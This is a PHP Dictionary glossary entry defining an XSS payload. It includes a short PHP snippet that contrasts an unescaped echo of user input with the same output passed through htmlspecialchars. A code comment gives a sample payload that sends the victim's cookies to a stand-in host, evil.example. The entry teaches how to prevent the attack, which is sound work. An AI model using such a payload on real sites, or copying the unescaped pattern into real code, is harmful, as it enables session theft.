# XSS Payload
An XSS payload is the malicious script or markup that an attacker injects into a vulnerable application to carry out a cross-site scripting attack.

The payload is crafted to execute in the victim's browser once the vulnerable page reflects or stores it without proper escaping. Payloads range from a simple ``<script>alert(1)</script>`` used to prove the vulnerability exists, to more advanced code that steals cookies, hijacks sessions, or performs actions on behalf of the victim.

Penetration testers and security scanners maintain lists of XSS payloads, including obfuscated and context-specific variants, to test whether an application's input handling and output escaping properly neutralise them.
<script type="application/ld+json">{"@context":["https:\/\/schema.org",{"skos":"http:\/\/www.w3.org\/2004\/02\/skos\/core#"}],"@graph":[{"@type":"DefinedTerm","@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/xss-payload.html","url":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/xss-payload.html","name":"XSS Payload","inDefinedTermSet":{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html#dictionary"},"isPartOf":{"@id":"https:\/\/www.exakat.io\/"},"datePublished":"Sun, 16 Aug 2026 07:54:45 +0000","dateModified":"Sun, 16 Aug 2026 07:54:45 +0000","description":"An XSS payload is the malicious script or markup that an attacker injects into a vulnerable application to carry out a cross-site scripting attack","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/XSS Payload.html"]}],"keywords":["security","vulnerability"],"skos:related":[{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/xss.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/stored-xss.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/payload.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/pentest.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/htmlspecialchars.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/vulnerability.html"}],"citation":[{"@type":"CreativeWork","name":"Documentation","url":"https:\/\/owasp.org\/www-community\/attacks\/xss\/"},{"@type":"CreativeWork","name":"PortSwigger XSS Cheat Sheet","url":"https:\/\/portswigger.net\/web-security\/cross-site-scripting\/cheat-sheet"},{"@type":"CreativeWork","name":"OWASP XSS Filter Evasion Cheat Sheet","url":"https:\/\/owasp.org\/www-community\/xss-filter-evasion-cheatsheet"}]},{"@type":"DefinedTermSet","@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html#dictionary","name":"The PHP Dictionary","alternateName":"PHP Dictionary","description":"A dictionary of PHP terms, keywords, functions, concepts and jargon.","url":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html","inLanguage":"en","version":"1.1.23","creator":{"@type":"Organization","name":"Exakat","url":"https:\/\/www.exakat.io\/"}},{"@type":"WebSite","@id":"https:\/\/www.exakat.io\/","url":"https:\/\/www.exakat.io\/","name":"Exakat","description":"Smart PHP static analysis","inLanguage":"en-US"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"The PHP Dictionary","item":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html"},{"@type":"ListItem","position":2,"name":"Index","item":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/index.html"},{"@type":"ListItem","position":3,"name":"xss-payload"}]}]}</script>
```php
<?php

    // Unescaped output lets the payload execute in the browser
    echo '<div>' . $_GET['comment'] . '</div>';
    // payload example: <script>document.location='https://evil.example/steal?c='+document.cookie</script>

    // Escaping neutralises the payload
    echo '<div>' . htmlspecialchars($_GET['comment'], ENT_QUOTES) . '</div>';

?>
```

**[Documentation](https://owasp.org/www-community/attacks/xss/)**
## See Also

+ [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+ [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

## Related

+ [Cross Site Scripting (XSS)](xss.html)
+ [Stored XSS](stored-xss.html)
+ [Payload](payload.html)
+ [Penetration Test](pentest.html)
+ [htmlspecialchars](htmlspecialchars.html)
+ [Vulnerability](vulnerability.html)
